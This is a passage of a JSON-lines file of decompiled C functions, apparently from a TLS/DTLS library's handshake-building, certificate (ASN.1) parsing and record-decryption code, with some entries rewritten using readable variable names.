0;\nFUN_00428240(plVar5,&local_4b,1);\nif ((1 < (ushort)(*(short *)(param_1 + 100) - 0x303U)) &&\n(1 < (ushort)(*(short *)(param_1 + 100) + 0x104U))) goto LAB_0042eb20;\nif (*(char **)(param_1 + 0x223c0) == (char *)0x0) {\nLAB_0042f004:\nFUN_00428330(plVar5,iVar10 + 0x22U & 0xffff);\n}\nelse {\nsVar7 = strlen(*(char **)(param_1 + 0x223c0));\niVar14 = (int)sVar7;\nif (iVar14 == 0) goto LAB_0042f004;\nFUN_00428330(plVar5,iVar10 + 0x2b + iVar14 & 0xffff);\nFUN_00428330(plVar5,0);\nFUN_00428330(plVar5,iVar14 + 5U & 0xffff);\nFUN_00428330(plVar5,iVar14 + 3U & 0xffff);\nlocal_4a = 0;\nFUN_00428240(plVar5,&local_4a,1);\nFUN_00428330(plVar5,sVar7 & 0xffff);\nFUN_00428240(plVar5,*(undefined8 *)(param_1 + 0x223c0),sVar7 & 0xffffffff);\n}\nFUN_00428330(plVar5,10);\nFUN_00428330(plVar5,8);\nFUN_00428330(plVar5,6);\nFUN_00428330(plVar5,(undefined2)DAT_00649384);\nFUN_00428330(plVar5,(undefined2)DAT_00649284);\nFUN_00428330(plVar5,(undefined2)DAT_00649484);\nif (uVar11 != 0) {\nFUN_00428330(plVar5,0x10);\nFUN_00428330(plVar5,(short)uVar11 + 2);\nFUN_00428330(plVar5,uVar11 & 0xffff);\nif (*(char *)(param_1 + 0x22418) != '\\0') {\nlVar13 = 0;\ndo {\npcVar3 = *(char **)(*(long *)(param_1 + 0x22410) + lVar13 * 8);\nif ((pcVar3 != (char *)0x0) && (sVar7 = strlen(pcVar3), (int)sVar7 != 0)) {\nlocal_49 = (undefined)sVar7;\nFUN_00428240(plVar5,&local_49,1);\nFUN_00428240(plVar5,*(undefined8 *)(*(long *)(param_1 + 0x22410) + lVar13 * 8),\nsVar7 & 0xffffffff);\n}\niVar10 = (int)lVar13;\nlVar13 = lVar13 + 1;\n} while (iVar10 + 1 < (int)(uint)*(byte *)(param_1 + 0x22418));\n}\n}\nFUN_00428330(plVar5,0xd);\nFUN_00428330(plVar5,0x12);\nFUN_00428330(plVar5,0x10);\nFUN_00428330(plVar5,0x401);\nFUN_00428330(plVar5,0x403);\nFUN_00428330(plVar5,0x501);\nFUN_00428330(plVar5,0x503);\nFUN_00428330(plVar5,0x601);\nFUN_00428330(plVar5,0x603);\nFUN_00428330(plVar5,0x201);\nFUN_00428330(plVar5,0x203);\nLAB_0042eb20:\nif (*(char *)(plVar5 + 2) == '\\0') {\nif (*plVar5 != 0) {\niVar4 = *(int *)(plVar5 + 1) - iVar4;\nuVar8 = -(ulong)(*(char *)(param_1 + 0x223c9) == '\\0') & 0xfffffffffffffff8;\niVar10 = iVar4 + 0xffff;\nif (-1 < iVar4) {\niVar10 = iVar4;\n}\n*(char *)(*plVar5 + 0xe + uVar8) = (char)((uint)iVar10 >> 0x10);\niVar4 = iVar4 % 0x10000;\niVar10 = iVar4 + 0xff;\nif (-1 < iVar4) {\niVar10 = iVar4;\n}\n*(char *)(*plVar5 + 0xf + uVar8) = (char)((uint)iVar10 >> 8);\n*(char *)(*plVar5 + 0x10 + uVar8) = (char)iVar4;\nif (*(char *)(param_1 + 0x223c9) != '\\0') {\n*(undefined *)(*plVar5 + 0x16) = *(undefined *)(*plVar5 + 0xe);\n*(undefined *)(*plVar5 + 0x17) = *(undefined *)(*plVar5 + 0xf);\n*(undefined *)(*plVar5 + 0x18) = *(undefined *)(*plVar5 + 0x10);\n*(char *)(param_1 + 0x223d9) = *(char *)(param_1 + 0x223d9) + '\\x01';\n}\nif (*(char *)(plVar5 + 2) != '\\0') {\nreturn plVar5;\n}\n}\nFUN_0042d8f0(plVar5);\n}\nreturn plVar5;\n}\nLocal Variable: local_48 : undefined1\nLocal Variable: local_49 : undefined1\nLocal Variable: local_4a : undefined1\nLocal Variable: local_4b : undefined1\nLocal Variable: local_4c : undefined1\nLocal Variable: local_4d : undefined1\nLocal Variable: local_4e : undefined1\nLocal Variable: local_4f : undefined1\nLocal Variable: local_50 : undefined1\nLocal Variable: local_51 : undefined1\nLocal Variable: local_52 : undefined1\nLocal Variable: local_53 : undefined1\nLocal Variable: local_60 : undefined8"}
{"Function Name": "FUN_0042fba0", "Address": "0042fba0", "Source Code": "ulong FUN_0042fba0(long input_param, undefined8 *data_array, int element_count)\n{\n    ulong result;\n    \n    if (data_array != (undefined8 *)0x0 && 0 < element_count) {\n        \n        for (undefined8 *current_element = data_array; current_element != data_array + element_count; current_element++) {\n            \n            result = FUN_00427150(*current_element);\n            \n            if ((int)result != 0) {\n                return result;\n            }\n        }\n    }\n    \n    \n    result = FUN_0042fa40(data_array, element_count);\n    \n    if ((int)result != 0) {\n        return result;\n    }\n    \n    \n    if (*(char *)(input_param + 0x66) == '\\0' && *(long *)(input_param + 0x223c0) != 0 && 0 < element_count) {\n        \n        result = FUN_004270b0(*data_array);\n        \n        if ((int)result != 0) {\n            return result;\n        }\n    }\n    \n    \n    result = (ulong)FUN_0042fad0(input_param, data_array, element_count);\n    \n    return result ? result : 0xff;\n}"}
{"Function Name": "FUN_0042fcd0", "Address": "0042fcd0", "Source Code": "uint FUN_0042fcd0(long param_1,ushort *param_2,long param_3,uint param_4,int param_5,int *param_6,\nundefined *param_7,int param_8,undefined8 *param_9,long param_10)\n{\nint *piVar1;\nchar *pcVar2;\nint *piVar3;\nbyte bVar4;\nushort uVar5;\nbyte bVar6;\nint iVar7;\nint iVar8;\nint iVar9;\nint iVar10;\nuint uVar11;\nint iVar12;\nvoid *pvVar13;\nlong lVar14;\nundefined8 uVar15;\nuint uVar16;\nuint uVar17;\nundefined8 *__src;\nushort *puVar18;\nbyte *__src_00;\nulong uVar19;\nint local_c8;\nint local_c4;\nbyte *local_98;\nint local_8c;\nchar local_6d;\nuint local_6c;\nint local_68;\nint local_64 [3];\nlong local_58;\nundefined8 *local_50;\nundefined8 local_48;\nundefined8 local_40;\n\nlocal_58 = param_10;\nlocal_50 = &local_48;\nlocal_48 = 0;\nlocal_40 = 0;\nif (param_7 != (undefined *)0x0) {\n*param_7 = 0;\n}\nlocal_6d = '\\0';\nif (param_4 == 0) {\nuVar11 = 0;\nlocal_8c = 0;\nlocal_98 = (byte *)0x0;\nLAB_004308ec:\nif (((param_5 == 2) && (*(long *)(param_2 + 100) != 0)) &&\n((*(int *)(param_2 + 0x68) != 0 && ((local_8c != 0 && (local_98 != (byte *)0x0)))))) {\nif (*(void **)(param_2 + 0x6c) != (void *)0x0) {\nfree(*(void **)(param_2 + 0x6c));\n}\nuVar15 = FUN_0042f620(*(undefined4 *)(param_2 + 2),local_98,local_8c);\n*(undefined8 *)(param_2 + 0x6c) = uVar15;\n}\nreturn uVar11;\n}\nif (0x7ffffffd < param_4 - 2) {\nreturn 0;\n}\nlocal_8c = 0;\nuVar19 = 0;\nlocal_98 = (byte *)0x0;\nlocal_c4 = 0;\niVar10 = param_5 + 1;\nLAB_0042fdc8:\niVar12 = (int)uVar19;\n__src_00 = (byte *)(uVar19 + param_3);\nuVar16 = iVar12 + 1;\nlocal_6c = 0;\nbVar4 = *__src_00;\nbVar6 = bVar4 & 0x1f;\nlocal_c8 = local_c4 + 1;\nif (param_5 < 0x100) {\nparam_6[(long)param_5 + -1] = local_c8;\n}\nuVar11 = FUN_0042f520((ulong)uVar16 + param_3,param_4 - uVar16,&local_6c);\nif (4 < local_6c) {\nreturn uVar16;\n}\nif (param_4 - uVar16 < local_6c) {\nreturn uVar16;\n}\nuVar16 = local_6c + uVar16;\nif ((int)(param_4 - uVar16) < (int)uVar11) {\nreturn 0;\n}\nif ((int)(param_4 - uVar16) < 0) {\nreturn 0;\n}\nif ((uVar11 != 0) && ((bVar4 & 0x20) != 0)) {\nif (bVar6 == 0x10) {\nif ((local_c8 == 1) && (param_5 == 2)) {\nlocal_8c = (uVar16 - iVar12) + uVar11;\nlocal_98 = __src_00;\n}\nif ((*param_2 == 0) && (*param_6 == 1)) {\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438b94 + lVar14);\nif (*piVar1 == 0) {\nif (*(void **)(param_2 + 0x70) != (void *)0x0) {\nfree(*(void **)(param_2 + 0x70));\n}\nuVar17 = (uVar16 - iVar12) + uVar11;\npvVar13 = malloc((ulong)uVar17);\n*(void **)(param_2 + 0x70) = pvVar13;\nif (pvVar13 == (void *)0x0) {\n*(undefined4 *)(param_2 + 0x74) = 0;\n}\nelse {\nmemcpy(pvVar13,__src_00,(ulong)uVar17);\n*(uint *)(param_2 + 0x74) = uVar17;\n}\nbreak;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\n}\n}\nlocal_6d = '\\0';\nFUN_0042fcd0(param_1,param_2,(ulong)uVar16 + param_3,uVar11,iVar10,param_6,&local_6d,param_8,\nparam_9,&local_58);\nif (local_6d == '\\0') {\nif (param_1 == 0) goto LAB_0042ffdc;\n}\nelse if (((param_1 == 0) || (*(char *)(param_1 + 0x66) == '\\0')) || (param_8 != 0)) {\nLAB_0042ffdc:\nif (*param_6 == 1) {\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438c34 + lVar14);\nif (*piVar1 == 0) {\nif (*(void **)(param_2 + 0x70) != (void *)0x0) {\nfree(*(void **)(param_2 + 0x70));\n}\nuVar17 = (uVar16 - iVar12) + uVar11;\npvVar13 = malloc((ulong)uVar17);\n*(void **)(param_2 + 0x70) = pvVar13;\nif (pvVar13 == (void *)0x0) {\n*(undefined4 *)(param_2 + 0x74) = 0;\n}\nelse {\nmemcpy(pvVar13,__src_00,(ulong)uVar17);\n*(uint *)(param_2 + 0x74) = uVar17;\n}\nbreak;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\n}\n}\ngoto switchD_004300cd_caseD_1;\n}\nswitch(bVar6) {\ncase 0:\nreturn uVar16;\ncase 2:\nlVar14 = 0;\nif (*param_6 == 1) {\ndo {\npiVar1 = (int *)((long)&DAT_00438c34 + lVar14);\nif (*piVar1 == 0) {\nif (param_7 != (undefined *)0x0) {\n*param_7 = 1;\n}\nif (local_c8 == 1) {\nFUN_00427310(param_2,(ulong)uVar16 + param_3,uVar11);\niVar12 = *param_6;\n}\nelse {\nif ((local_c8 != 2) ||\n(FUN_00427230(param_2 + 8,(ulong)uVar16 + param_3,uVar11),\n*(long *)(param_2 + 8) == 0)) goto LAB_00430333;\n*(uint *)(param_2 + 0xc) = uVar11;\niVar12 = *param_6;\n}\ngoto LAB_00430335;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\nlVar14 = 0;\nLAB_00430875:\npiVar1 = (int *)((long)&DAT_00438c14 + lVar14);\nif (*piVar1 != 0) goto LAB_00430868;\nFUN_00427230(param_2 + 0x5c,(ulong)uVar16 + param_3,uVar11);\nif (*(long *)(param_2 + 0x5c) != 0) {\n*(uint *)(param_2 + 0x60) = uVar11;\n}\nLAB_00430333:\niVar12 = *param_6;\nLAB_00430335:\nif (iVar12 == 1) {\nLAB_0043033a:\nlVar14 = 0;\nwhile (piVar1 = (int *)((long)&DAT_00438c44 + lVar14), *piVar1 != 0) {\nlVar14 = lVar14 + 4;\nif (*(int *)((long)param_6 + lVar14) != *piVar1) goto LAB_00430372;\n}\nif (uVar11 == 1) {\n*param_2 = (ushort)*(byte *)(param_3 + (ulong)uVar16);\n}\nelse {\n*param_2 = 0;\n}\nlocal_c8 = local_c4 + 2;\n}\n}\nLAB_00430372:\nif (1 < param_5) {\nlocal_64[1] = 0;\nlocal_68 = param_6[(long)param_5 + -2];\nlocal_64[0] = param_6[(long)param_5 + -1];\nif (local_68 == 1) {\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438ba4 + lVar14);\nif (*piVar1 == 0) {\nFUN_00427230(param_2 + 0x18,(ulong)uVar16 + param_3,uVar11);\nif (*(long *)(param_2 + 0x18) != 0) {\n*(uint *)(param_2 + 0x1c) = uVar11;\n}\nbreak;\n}\npiVar3 = (int *)((long)local_64 + lVar14);\nlVar14 = lVar14 + 4;\n} while (*piVar3 == *piVar1);\n}\n}\nif (((2 < uVar11) && (param_10 != 0)) &&\n(iVar12 = FUN_0042fc60(param_10,&DAT_00438b7a,3), iVar12 != 0)) {\npvVar13 = realloc(*(void **)(param_2 + 0x50),(ulong)param_2[0x54] * 8 + 8);\n*(void **)(param_2 + 0x50) = pvVar13;\nif (pvVar13 == (void *)0x0) {\nparam_2[0x54] = 0;\n}\nelse {\nuVar5 = param_2[0x54];\n*(undefined8 *)((long)pvVar13 + (ulong)uVar5 * 8) = 0;\nFUN_00427230(*(long *)(param_2 + 0x50) + (ulong)uVar5 * 8,(ulong)uVar16 + param_3,uVar11);\nparam_2[0x54] = param_2[0x54] + 1;\n}\n}\nbreak;\ncase 3:\nif (*param_6 == 1) {\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438c34 + lVar14);\nif (*piVar1 == 0) {\nif ((param_7 != (undefined *)0x0) && (*param_7 = 1, *param_6 != 1)) goto LAB_00430688;\nbreak;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438bb4 + lVar14);\nif (*piVar1 == 0) {\nFUN_00427390(param_2,(ulong)uVar16 + param_3,uVar11);\ngoto switchD_004300cd_caseD_1;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\nif (*(int *)(param_2 + 6) != 0) {\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438c34 + lVar14);\nif (*piVar1 == 0) {\nFUN_00427310(param_2,(ulong)uVar16 + param_3,uVar11);\ngoto switchD_004300cd_caseD_1;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\n}\n}\nLAB_00430688:\npcVar2 = (char *)(param_3 + (ulong)uVar16);\nif ((*pcVar2 == '\\0') && (0x100 < uVar11)) {\nFUN_0042fcd0(param_1,param_2,param_3 + 1 + (ulong)uVar16,uVar11 - 1,iVar10,param_6,&local_6d,\nparam_8,param_9,&local_58);\n}\nelse {\nFUN_0042fcd0(param_1,param_2,pcVar2,uVar11,iVar10,param_6,&local_6d,param_8,param_9,&local_58)\n;\n}\niVar9 = DAT_00649484;\niVar8 = DAT_00649384;\niVar7 = DAT_00649284;\niVar12 = DAT_00649204;\nif (param_9 == (undefined8 *)0x0) break;\nif (((*(char *)param_9 == '*') && (*(char *)((long)param_9 + 1) == -0x7a)) &&\n(*(char *)((long)param_9 + 2) == 'H')) {\n*(int *)(param_2 + 6) = DAT_00649384;\niVar12 = iVar8;\n}\nelse {\nlVar14 = 0;\ndo {\nif (*(char *)((long)param_9 + lVar14) != (&DAT_00438add)[lVar14]) {\nlVar14 = 0;\ngoto LAB_00430b30;\n}\nlVar14 = lVar14 + 1;\n} while (lVar14 != 5);\n*(int *)(param_2 + 6) = DAT_00649484;\niVar12 = iVar9;\n}\ngoto LAB_00430741;\ncase 4:\nif ((param_9 != (undefined8 *)0x0) && (*param_6 == 1)) {\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438b84 + lVar14);\nif (*piVar1 == 0) {\nif (*(long *)(param_2 + 0x18) == 0) {\nFUN_00427230(param_2 + 0x18,(ulong)uVar16 + param_3,uVar11);\nif (*(long *)(param_2 + 0x18) != 0) {\n*(uint *)(param_2 + 0x1c) = uVar11;\n}\ngoto switchD_004300cd_caseD_1;\n}\nbreak;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\n}\nFUN_0042fcd0(param_1,param_2,(ulong)uVar16 + param_3,uVar11,iVar10,param_6,&local_6d,param_8,\nparam_9,&local_58);\nbreak;\ncase 6:\nif (*param_6 == 1) {\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438c34 + lVar14);\nif (*piVar1 == 0) {\nif ((uVar11 == 5) || (uVar11 == 8)) {\npuVar18 = param_2 + 6;\n}\nelse {\npuVar18 = param_2 + 4;\n}\n__src = (undefined8 *)((ulong)uVar16 + param_3);\nFUN_00427ab0(param_1,puVar18,__src,uVar11);\nif (*param_6 == 1) goto LAB_00430175;\ngoto LAB_004301b6;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\n__src = (undefined8 *)((ulong)uVar16 + param_3);\nLAB_00430175:\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438bd4 + lVar14);\nif (*piVar1 == 0) {\nFUN_00427ab0(param_1,param_2 + 2,__src,uVar11);\nbreak;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\n}\nelse {\n__src = (undefined8 *)((ulong)uVar16 + param_3);\n}\nLAB_004301b6:\nlVar14 = 0;\ndo {\nif (*(char *)((long)&local_48 + lVar14) != (&DAT_00438b71)[lVar14]) goto LAB_004301fb;\nlVar14 = lVar14 + 1;\n} while (lVar14 != 8);\nFUN_00427230(param_2 + 0x58,__src,uVar11);\nLAB_004301fb:\nif (uVar11 < 0x10) {\nmemcpy(&local_48,__src,(ulong)uVar11);\n}\nelse {\nlocal_48 = *__src;\nlocal_40 = __src[1];\n}\nif (param_9 != (undefined8 *)0x0) {\n*param_9 = local_48;\nparam_9[1] = local_40;\n}\nbreak;\ncase 0xc:\ncase 0x13:\ncase 0x14:\ncase 0x15:\ncase 0x16:\ncase 0x19:\ncase 0x1a:\ncase 0x1b:\ncase 0x1c:\ncase 0x1d:\ncase 0x1e:\nlVar14 = 0;\nif (*param_6 == 1) {\ndo {\npiVar1 = (int *)((long)&DAT_00438c04 + lVar14);\nif (*piVar1 == 0) {\nif ((char)local_48 != '\\0') {\nif ((char)local_48 != 'U') goto switchD_004300cd_caseD_1;\nif (local_48._1_1_ != '\\0') {\nif (local_48._1_1_ != '\\x04') goto switchD_004300cd_caseD_1;\nif ((local_48._2_1_ != '\\0') && (local_48._2_1_ != '\\x06')) {\nif ((local_48._2_1_ == '\\0') || (local_48._2_1_ == '\\b')) {\nFUN_00427230(param_2 + 0x24,(ulong)uVar16 + param_3,uVar11);\n}\nelse if ((local_48._2_1_ == '\\0') || (local_48._2_1_ == '\\a')) {\nFUN_00427230(param_2 + 0x28,(ulong)uVar16 + param_3,uVar11);\n}\nelse if ((local_48._2_1_ == '\\0') || (local_48._2_1_ == '\\n')) {\nFUN_00427230(param_2 + 0x2c,(ulong)uVar16 + param_3,uVar11);\n}\nelse if ((local_48._2_1_ == '\\0') || (local_48._2_1_ == '\\x03')) {\nFUN_00427230(param_2 + 0x30,(ulong)uVar16 + param_3,uVar11);\n}\ngoto switchD_004300cd_caseD_1;\n}\n}\n}\nFUN_00427230(param_2 + 0x20,(ulong)uVar16 + param_3,uVar11);\ngoto switchD_004300cd_caseD_1;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438bf4 + lVar14);\nif (*piVar1 == 0) {\nif ((char)local_48 != '\\0') {\nif ((char)local_48 != 'U') break;\nif (local_48._1_1_ != '\\0') {\nif (local_48._1_1_ != '\\x04') break;\nif ((local_48._2_1_ != '\\0') && (local_48._2_1_ != '\\x06')) {\nif ((local_48._2_1_ == '\\0') || (local_48._2_1_ == '\\b')) {\nFUN_00427230(param_2 + 0x40,(ulong)uVar16 + param_3,uVar11);\n}\nelse if ((local_48._2_1_ == '\\0') || (local_48._2_1_ == '\\a')) {\nFUN_00427230(param_2 + 0x44,(ulong)uVar16 + param_3,uVar11);\n}\nelse if ((local_48._2_1_ == '\\0') || (local_48._2_1_ == '\\n')) {\nFUN_00427230(param_2 + 0x48,(ulong)uVar16 + param_3,uVar11);\n}\nelse if ((local_48._2_1_ == '\\0') || (local_48._2_1_ == '\\x03')) {\nFUN_00427230(param_2 + 0x4c,(ulong)uVar16 + param_3,uVar11);\n}\nbreak;\n}\n}\n}\nFUN_00427230(param_2 + 0x3c,(ulong)uVar16 + param_3,uVar11);\nbreak;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\n}\nbreak;\ncase 0x17:\nif (*param_6 == 1) {\nlVar14 = 0;\ndo {\npiVar1 = (int *)((long)&DAT_00438be4 + lVar14);\nif (*piVar1 == 0) {\nif (local_c8 == 1) {\nFUN_00427290(param_2 + 0x34,(ulong)uVar16 + param_3,uVar11);\n}\nelse {\nFUN_00427290(param_2 + 0x38,(ulong)uVar16 + param_3,uVar11);\n}\nbreak;\n}\nlVar14 = lVar14 + 4;\n} while (*(int *)((long)param_6 + lVar14) == *piVar1);\n}\n}\ngoto switchD_004300cd_caseD_1;\nwhile (lVar14 = lVar14 + 1, lVar14 != 5) {\nLAB_00430b30:\nif (*(char *)((long)param_9 + lVar14) != (&DAT_00438ad7)[lVar14]) {\nlVar14 = 0;\ngoto LAB_00430b77;\n}\n}\n*(int *)(param_2 + 6) = DAT_00649284;\niVar12 = iVar7;\ngoto LAB_00430741;\nwhile (lVar14 = lVar14 + 1, lVar14 != 5) {\nLAB_00430b77:\nif (*(char *)((long)param_9 + lVar14) != (&DAT_00438ad1)[lVar14]) {\niVar12 = *(int *)(param_2 + 6);\ngoto LAB_00430741;\n}\n}\n*(int *)(param_2 + 6) = DAT_00649204;\nLAB_00430741:\nif ((iVar12 != 0) && (*(long *)(param_2 + 0x10) == 0)) {\nFUN_00427310(param_2,pcVar2,uVar11);\n}\nswitchD_004300cd_caseD_1:\nuVar11 = uVar11 + uVar16;\nuVar19 = (ulong)uVar11;\nif (param_4 <= uVar11) goto LAB_004308ec;\nif (0x7ffffffd < (param_4 - 2) - uVar11) {\nreturn 0;\n}\nlocal_c4 = local_c8;\ngoto LAB_0042fdc8;\nLAB_00430868:\nlVar14 = lVar14 + 4;\nif (*(int *)((long)param_6 + lVar14) != *piVar1) goto LAB_0043033a;\ngoto LAB_00430875;\n}\nLocal Variable: local_40 : undefined8\nLocal Variable: local_48 : undefined8\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined8\nLocal Variable: local_60 : undefined4\nLocal Variable: local_64 : undefined4\nLocal Variable: local_68 : undefined4\nLocal Variable: local_6c : undefined4\nLocal Variable: local_6d : undefined1\nLocal Variable: local_80 : undefined8\nLocal Variable: local_88 : undefined8\nLocal Variable: local_8c : undefined4\nLocal Variable: local_90 : undefined4\nLocal Variable: local_98 : undefined8\nLocal Variable: local_a0 : undefined8\nLocal Variable: local_a4 : undefined4\nLocal Variable: local_a5 : undefined1\nLocal Variable: local_b0 : undefined8\nLocal Variable: local_b4 : undefined4\nLocal Variable: local_b8 : undefined4\nLocal Variable: local_c0 : undefined8\nLocal Variable: local_c4 : undefined4\nLocal Variable: local_c8 : undefined4\nLocal Variable: local_cc : undefined4\nLocal Variable: local_d8 : undefined8\nLocal Variable: local_e0 : undefined8\nLocal Variable: local_e8 : undefined8\nLocal Variable: local_f0 : undefined4\nLocal Variable: local_f8 : undefined8"}
{"Function Name": "FUN_00430d50", "Address": "00430d50", "Source Code": "long FUN_00430d50(undefined8 inputParam1, undefined8 inputParam2, undefined4 inputParam3, int inputParam4)\n{\n    long returnValue; \n    undefined8 localArray[130] = {0}; \n    returnValue = FUN_00426f70(); \n    if (returnValue != 0) { \n        if (inputParam4 < 0) { \n            inputParam4 = 0; \n        }\n        \n        FUN_0042fcd0(inputParam1, returnValue, inputParam2, inputParam3, 1, localArray, 0, inputParam4, (undefined8 *)0x0, 0);\n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_00432d00", "Address": "00432d00", "Source Code": "int FUN_00432d00(long param_1,undefined2 *param_2,int param_3,undefined8 param_4)\n{\nbyte bVar1;\nlong lVar2;\nlong lVar3;\nbyte bVar4;\nchar cVar5;\nbyte bVar6;\nchar cVar7;\nundefined4 uVar8;\nushort uVar9;\nint iVar10;\nuint uVar11;\nuint uVar12;\nuint uVar13;\nundefined8 uVar14;\nbyte *__s;\nbyte *pbVar15;\nint iVar16;\nushort uVar17;\nuint uVar18;\nuint uVar19;\nint iVar20;\nushort uVar21;\nulong __size;\nbyte *pbVar22;\nbyte *local_150;\nundefined8 local_118;\nbyte local_110;\nbyte local_10f;\nbyte local_10e;\nushort local_10d;\nundefined local_10b;\nundefined local_10a;\nundefined local_109;\nundefined local_108;\nundefined local_107;\nundefined local_106;\nundefined local_105;\nundefined4 local_104;\nundefined local_100;\nundefined local_ff;\nundefined local_fe;\nundefined local_fd;\nundefined4 local_fc;\nlong local_f8 [2];\nundefined2 local_e8;\nbyte bStack_e6;\nundefined uStack_e5;\nundefined uStack_e4;\nundefined7 uStack_e3;\nundefined local_c8 [152];\n\ncVar5 = *(char *)(param_1 + 0x223c9);\niVar16 = (-(uint)(cVar5 == '\\0') & 0xfffffff8) + 0xd;\nif ((param_3 < iVar16) || (param_3 < 0)) {\nreturn 0;\n}\nbVar6 = *(byte *)param_2;\nuVar21 = *(ushort *)((long)param_2 + 1) >> 8;\nuVar9 = *(ushort *)((long)param_2 + 1) << 8;\nuVar17 = uVar21 | uVar9;\nif (cVar5 == '\\0') {\nuVar14 = 0;\niVar10 = 3;\n}\nelse {\nif (param_3 < 0xb) {\nreturn 0;\n}\niVar10 = 0xb;\nuVar18 = (uint)*(undefined8 *)((long)param_2 + 3);\nuVar19 = (uint)((ulong)*(undefined8 *)((long)param_2 + 3) >> 0x20);\nuVar14 = CONCAT44(uVar18 >> 0x18 | (uVar18 & 0xff0000) >> 8 | (uVar18 & 0xff00) << 8 |\nuVar18 << 0x18,\nuVar19 >> 0x18 | (uVar19 & 0xff0000) >> 8 | (uVar19 & 0xff00) << 8 |\nuVar19 << 0x18);\n}\nif (((3 < (ushort)(uVar17 - 0x301)) && (uVar17 != 0xfefc)) &&\n((uVar21 & 0xfffd | uVar9) != 0xfefd)) {\nif (uVar17 != 0x300) {\nreturn -4;\n}\nif (*(char *)(param_1 + 0x22388) != '\\0') {\nreturn -4;\n}\n}\nuVar21 = *(ushort *)((long)param_2 + (long)iVar10) >> 8 |\n*(ushort *)((long)param_2 + (long)iVar10) << 8;\nuVar19 = (uint)uVar21;\nuVar18 = (uint)uVar21;\nif (param_3 < (int)(uVar18 + iVar10 + 2)) {\nreturn 0;\n}\niVar20 = iVar16;\nif (*(char *)(param_1 + 0xd4) == '\\0') {\n__s = (byte *)0x0;\npbVar22 = (byte *)((long)param_2 + (long)(iVar10 + 2));\ngoto LAB_00432db0;\n}\nif (bVar6 != 0x14) {\ncVar7 = *(char *)(param_1 + 0x22358);\nif (cVar7 == '\\0') goto LAB_00433208;\n__size = (ulong)uVar21;\n__s = (byte *)malloc(__size);\nif (__s == (byte *)0x0) {\nFUN_0042a0e0(param_1,1000000);\nreturn -9;\n}\nuVar13 = (uint)uVar14;\nuVar11 = (uint)((ulong)uVar14 >> 0x20);\npbVar22 = __s;\nif (cVar7 == '\\x02') {\nlVar3 = param_1 + 0x111e8;\nFUN_004246b0(lVar3);\nuVar19 = uVar18 - 0x18;\nif (*(char *)(param_1 + 0x223c9) == '\\0') {\nuVar14 = *(undefined8 *)(param_1 + 0x22378);\nuVar18 = (uint)uVar14;\nuVar18 = uVar18 >> 0x18 | (uVar18 & 0xff0000) >> 8 | (uVar18 & 0xff00) << 8 | uVar18 << 0x18\n;\n}\nelse {\nuVar18 = uVar13 >> 0x18 | (uVar13 & 0xff0000) >> 8 | (uVar13 & 0xff00) << 8 | uVar13 << 0x18\n;\n}\nuVar13 = (uint)((ulong)uVar14 >> 0x20);\nlocal_118 = CONCAT44(uVar18,uVar13 >> 0x18 | (uVar13 & 0xff0000) >> 8 | (uVar13 & 0xff00) << 8\n| uVar13 << 0x18);\nlocal_110 = *(byte *)param_2;\nlocal_10f = *(byte *)((long)param_2 + 1);\nlocal_10e = *(byte *)(param_2 + 1);\nuVar8 = *(undefined4 *)(param_1 + 0x22328);\nlocal_e8 = (undefined2)uVar8;\nbStack_e6 = (byte)((uint)uVar8 >> 0x10);\nuStack_e5 = (undefined)((uint)uVar8 >> 0x18);\nuVar14 = *(undefined8 *)((long)param_2 + (long)iVar16);\nuStack_e4 = (undefined)uVar14;\nuStack_e3 = (undefined7)((ulong)uVar14 >> 8);\nlocal_10d = (ushort)uVar19 >> 8 | (ushort)uVar19 << 8;\nif (-1 < (int)uVar19) {\nuVar18 = FUN_004234c0(lVar3,&local_e8,0xc);\nuVar13 = FUN_00424350(lVar3,&local_118,0xd);\nmemset(__s,0,__size);\nlVar2 = (long)iVar16 + 8;\nuVar11 = FUN_004238a0(lVar3,__s,(long)(int)uVar19,(byte *)((long)param_2 + lVar2),1);\nlocal_f8[0] = 0x20;\nuVar12 = FUN_004236b0(lVar3,local_c8,local_f8);\nif (((uVar13 | uVar18 | uVar11 | uVar12) != 0) || (local_f8[0] != 0x10)) goto LAB_00433208;\niVar10 = memcmp((byte *)((int)uVar19 + lVar2 + (long)param_2),local_c8,0x10);\nif (iVar10 != 0) {\nfree(__s);\ngoto LAB_004331ca;\n}\ngoto LAB_00432db0;\n}\n}\nelse if (cVar7 == '\\x03') {\nuVar19 = uVar18 - 0x10;\nif (-1 < (int)uVar19) {\nif (cVar5 == '\\0') {\nuVar18 = (uint)*(undefined8 *)(param_1 + 0x22378);\nuVar13 = (uint)((ulong)*(undefined8 *)(param_1 + 0x22378) >> 0x20);\nlocal_118 = CONCAT44(uVar18 >> 0x18 | (uVar18 & 0xff0000) >> 8 | (uVar18 & 0xff00) << 8 